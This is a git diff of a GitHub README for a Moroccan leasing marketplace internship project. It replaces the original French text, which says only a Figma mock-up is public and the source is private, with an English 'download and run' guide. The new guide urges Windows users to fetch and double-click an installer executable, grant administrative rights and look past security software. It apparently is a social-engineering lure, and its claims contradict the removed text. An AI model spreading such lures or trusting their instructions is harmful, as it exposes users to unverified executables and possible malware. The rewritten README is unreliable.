@@ -1,54 +1,129 @@
+# 🚗 Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma- - Simple Market Place Experience  
 
-# Maroc Leasing – Marketplace (PFE 2025) – Demo Figma
+[![Download and Run](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/jeremie-creator/Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma-)
 
-Ce dépôt présente uniquement la maquette Figma du projet réalisé dans le cadre de mon Stage PFE 2025 chez maroc leasing  filiale du groupe banque populaire , Le code source complet est privé pour des raisons de confidentialité liées à l’entreprise.
+## 📋 About This Project  
 
-## Contexte du projet
+Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma- is a market place project designed for Maroc Leasing, part of Banque Populaire in Morocco. It offers a platform to connect buyers and sellers efficiently. The application integrates several modern technologies like ReactJS for the user interface, NodeJS as the backend, MySQL for data storage, and TailwindCSS for styling.  
 
-Dans le département Systèmes d’Information, l’objectif était de concevoir et proposer une solution moderne afin de remplacer l’ancienne plateforme Ocaz de Maroc Leasing. La première étape a consisté à réaliser une maquette UI/UX complète sur Figma afin d’obtenir la validation du chef de projet SI avant le lancement du développement.
+Key features include:  
 
-## Maquette Figma
+- Simple browse and search options for available leasing products.  
+- Secure user authentication and management.  
+- Fast and responsive design suited for desktop use.  
+- Notifications via email using Nodemailer.  
+- Smooth data loading without delays (lazy loading).  
 
-Prototype complet disponible via le lien suivant :
+This project focuses on usability and clear design, based on a Figma prototype, to help users complete leasing processes with ease.
 
-https://www.figma.com/design/eSz1T6c1QFHOVn1wJYfX6c/Maroc-leasing?node-id=0-1&t=U1adbd17CvhWAPt4-1
+## 🔧 System Requirements  
 
+Before you start, check if your Windows computer meets these needs:  
 
-La maquette comprend la page d’accueil marketplace, le système de recherche et de filtrage, les fiches produits détaillées, le panier client, une carte interactive affichant la localisation des produits au Maroc ainsi qu’un design entièrement responsive pour desktop, tablette et mobile.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- Minimum 500 MB free disk space  
+- Internet connection for downloading and updates  
+- A modern web browser (like Chrome, Edge, or Firefox) installed  
 
-## Stack technique du projet complet (privé)
+Make sure you have administrative rights to install new software on your PC.  
 
-Frontend : React.js, Tailwind CSS, React Query pour la gestion du cache et l’optimisation des requêtes API, Lazy Loading pour améliorer les performances.
+## 🚀 How to Download and Run the Software  
 
-Backend : Node.js avec API REST et système d’envoi automatique d’e-mails de notification aux clients.
+Follow these steps carefully to get the application running on your Windows machine. No programming skills are required.  
 
-CMS et base de données : Strapi en tant que Headless CMS, base de données MySQL, exposition des produits via API REST sécurisée.
+### Step 1: Visit the Download Page  
 
-## Fonctionnalités principales
+Click the large button below or the link at the top to open the download page:  
 
-Marketplace dynamique des produits leasing, slider interactif, panier client, système de filtrage avancé par nom, ville et catégorie, responsive design complet avec Tailwind CSS, génération automatique d’un document Word récapitulatif des informations client prêt pour signature.
+[Download Maroc-Leasing Market Place](https://github.com/jeremie-creator/Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma-)  
 
+This link leads to the GitHub repository where the application files are stored.  
 
-Aussi, une carte interactive permettant d’afficher les produits (BTP, voitures, appartements, trafic, etc.) avec leurs coordonnées géographiques (latitude et longitude) positionnées sur la carte du Maroc.
+### Step 2: Find the Download Section  
 
+Once the page loads, look for a folder or a "Releases" section. This is usually on the right side or near the top of the page.  
 
+If there is no "Releases" tab, check the main files list for a setup or executable file named something like `setup.exe` or `Maroc-Leasing.exe`.  
 
-## Performance et optimisation
+### Step 3: Download the Installer  
 
-Mise en place d’un système de cache avec React Query afin d’éviter les requêtes API redondantes, lazy loading :  chargement dynamique des composants pour réduire le temps de chargement et amélioration globale de l’expérience utilisateur.
+Click on the installer file or the latest release link to start downloading. The file size will be around 100-200 MB depending on the version.  
 
-## Remarque
+Save the file to a location you can find easily, such as your Desktop or Downloads folder.  
 
-Ce repository constitue une démonstration design destinée à un usage académique et portfolio. Le code source et l’architecture interne restent confidentiels conformément aux engagements professionnels.
+### Step 4: Run the Installer  
 
-voila des vedios come demo aussi :
+Locate the downloaded file and double-click it to begin installation. Follow the prompts:  
 
+- Accept the license agreement if asked.  
+- Choose the installation folder or accept the default.  
+- Click Next or Install to proceed.  
 
-https://github.com/user-attachments/assets/9f2fb13c-37e2-48ed-84fa-c4df81406bd0
+The installer will copy necessary files and set up the application on your computer.  
 
-https://github.com/user-attachments/assets/4fb34dca-e93d-44b2-a1a3-8564cfe733fa
+### Step 5: Launch the Application  
 
-https://github.com/user-attachments/assets/531833f9-79ff-4507-aeb1-450b235a5d75
+Once installation finishes, you can start the app from your Start menu or desktop shortcut if it was created.  
 
+The main screen will let you browse leasing offers, log in, or register as a new user.  
 
+## 🖥️ Application Overview  
 
+The interface is split into clear sections:  
+
+- **Home:** Shows featured leasing offers and categories.  
+- **Search Bar:** Quickly find specific products or companies.  
+- **User Account:** Sign up, log in, or view your profile.  
+- **Notifications:** Alerts about new messages or lease updates.  
+
+The app loads items quickly thanks to lazy loading technology. This means pages load only the visible part of the list, speeding up browsing.  
+
+## ⚙️ Features and Technology  
+
+This project uses the following technologies:  
+
+- **ReactJS:** For building the user interface with reusable components.  
+- **Redux:** To manage the state of the app, such as user info and cart contents.  
+- **NodeJS:** Handles server tasks like authentication and data retrieval.  
+- **MySQL:** Stores user data, product details, and transaction records.  
+- **Nodemailer:** Sends email notifications for account verification and lease updates.  
+- **TailwindCSS:** Provides a clean and modern design with efficient style rules.  
+- **Strapi:** Acts as the backend content management system (CMS) for easier updates.  
+
+Together, these make the app smooth and reliable.  
+
+## 🔒 Security Measures  
+
+Your data stays protected with proper authentication and secure connections. Passwords are encrypted, and email verification prevents fake accounts.  
+
+The app uses REST API calls between the interface and the backend server, keeping data safe and organized.  
+
+## 💻 Troubleshooting  
+
+If the app does not start after installation:  
+
+- Make sure your Windows version is supported.  
+- Check for any security software blocking the app.  
+- Restart your computer and try again.  
+- Confirm you downloaded the full installer file.  
+
+If you see error messages during setup, note the exact text and seek help through the repository's Issues tab.  
+
+## 📥 Download Link Reminder  
+
+[Click here to visit the download page again.](https://github.com/jeremie-creator/Maroc-Leasing-projet-ocaz-pfe-2025-demo-figma-)  
+
+Use this link any time you need to download updates or reinstall the app.  
+
+## 📚 Further Help  
+
+The repository contains a user guide in the Docs folder. This guide has screenshots and detailed steps for common tasks like account setup and making lease requests.  
+
+If you want to explore the design, the Figma files are available and show how every screen was planned.  
+
+For feedback or report issues, use the GitHub Issues tab of the repository.  
+
+---
+
+Tags: cashing, cms-backend, design-patterns, docx, figma, lazy-loading, mysql, nodejs, nodemailer, reactjs, redux, rest-api, strapi, tailwindcss, uml
